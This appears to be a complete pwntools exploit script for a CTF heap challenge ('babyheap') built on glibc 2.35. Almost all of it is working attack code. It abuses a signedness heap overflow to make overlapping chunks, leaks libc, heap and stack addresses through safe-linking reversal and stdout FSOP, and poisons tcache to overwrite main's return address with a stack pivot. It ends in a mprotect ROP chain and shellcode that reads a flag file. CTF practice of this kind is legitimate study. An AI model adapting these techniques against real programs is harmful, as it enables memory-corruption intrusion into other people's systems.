#!/usr/bin/env python3

from pwn import *

elf = ELF('./babyheap_patched')

libc = elf.libc

context.arch = 'amd64'

gs = '''
    dir ./glibc-2.35
    continue
'''

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()


io = conn()

def a(size, content):
    io.sendlineafter(b'Command: ', b'1')
    io.sendlineafter(b'Size: ', f'{size}'.encode())
    io.sendlineafter(b'Content: ', content)
    io.recvuntil(b'Chunk ')
    return int(io.recv(1))

def u(index, content):
    io.sendlineafter(b'Command: ', b'2')
    io.sendlineafter(b'Index: ', f'{index}'.encode())
    io.sendlineafter(b'Size: ', b'-1') # this trigger the signedness issue and causes a heap overflow
    io.sendlineafter(b'Content: ', content)

def d(index):
    io.sendlineafter(b'Command: ', b'3')
    io.sendlineafter(b'Index: ', f'{index}'.encode())

def v(index):
    io.sendlineafter(b'Command: ', b'4')
    io.sendlineafter(b'Index: ', f'{index}'.encode())
    io.recvuntil(b': ')

# helper function for safe linking 

def protect(addr, ptr):
    return addr ^ (ptr >> 12)

def reveal(addr):
    mask = 0xfff << 52
    while mask:
        v = addr & mask
        addr ^= (v >> 12)
        mask >>= 12
    return addr

# using the heap overflow for overlapping chunks

chunk_A = a(0x18, b'chunk_A')
chunk_B = a(0x18, b'chunk_B') # we will overwrite this chunk's size with 0xb1 so then free it
chunk_C = a(0x88, b'chunk_C')

for i in range(7):
    a(0xa8, b'fill tcache')

for i in range(7):
    d(i+3)



u(chunk_A, b'A'*0x18 + p32(0xb1))

d(chunk_B) 

# leak !!

a(0x18, b'aa')

v(chunk_C)

libc.address = u64(io.recv(8)) - 0x219ce0

log.success(f'libc @ 0x{libc.address:02x}')


chunk_D = a(0x18, b'overlap') # chunk_C overlapps chunk_D

chunk_E = a(0x18, b'dummy')

d(chunk_E)
d(chunk_D)

v(chunk_C)

heap = reveal(u64(io.recv(8))) -0x300

log.success(f'heap @ 0x{heap:02x}')

# fsop to leak stack

u(chunk_C, p64(protect(libc.sym._IO_2_1_stdout_, heap+0x300)))


# __printf -> __vfprintf_internal -> outstring_func -> _IO_new_file_xsputn  -> _IO_OVERFLOW(fp, EOF) -> _IO_new_file_overflow


_flags = 0xfbad1800
_IO_write_base = libc.sym.environ
_IO_write_ptr = libc.sym.environ+0x8
_IO_write_end = libc.sym.environ+0x8
_IO_buf_base = libc.sym.environ+0x8
_IO_buf_end = libc.sym.environ+0x8


chunk_F = a(0x18, b'chunk_C overlapps chunk_F')

chunk_G = a(0x18, p64(_flags))



'''
    stdout->_IO_write_base = libc.sym.environ
    stdout->
'''

#log.warn('breakrva 0x0000000000001AA4')


u(chunk_G, flat([
    _flags,
    0,0,0,
    _IO_write_base,
    _IO_write_ptr,
    _IO_write_end,
    _IO_buf_base,
    _IO_buf_end
    ]))


stack = u64(io.recv(8))

log.success(f'stack @ 0x{stack:02x}')

main_ret = stack-0x120

log.info(f'main ret @ 0x{main_ret:02x}')

flag = heap+0xa60


shellcode = f'''
        
        nop
        nop
        nop
        nop
        mov rdi, 0x{flag:02x}
        mov rsi, 0x0
        mov rax, SYS_open
        syscall

        mov rdi, 0x3
        mov rsi, 0x{heap:02x}
        mov rdx, 0x100
        mov rax, SYS_read
        syscall

        mov rdi, 0x1
        mov rsi, 0x{heap:02x}
        mov rdx, 0x20
        mov rax, SYS_write
        syscall
'''

a(0x100, asm(shellcode))

pop_rsi_ret = libc.address + 0x112ca8
pop_rdi_ret = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6
pop_rdx_ret = 0x000000000011f497 + libc.address
leave_ret = libc.address + 0x133d9a #  pivot from stack to heap cz null bytes

rop = flat([
    0xdeadbeefdeadbeef,
    pop_rdi_ret,
    heap,
    pop_rsi_ret,
    0xdeadbeef,
    pop_rdx_ret,
    0x7,
    0xdeadbeef,
    libc.sym.mprotect,
    ret,
    heap+0x840        
    ])


a(0x100, rop)

chunk_I = a(0x100, b'/home/user/ctf/flag.txt')


chunk_J = a(0x18, b'chunk_J')

d(chunk_J)

d(chunk_F)

u(chunk_C, p64(protect(main_ret-0x8, heap+0x2e0))) # tcache poisoning

a(0x18, b'aaa') # allocate authentic chunk

a(0x18, p64(heap+0x950) + p64(leave_ret)) # overwrite main retn on stack with a stack pivot gadget

io.sendlineafter(b'Command: ', b'5')

io.interactive()
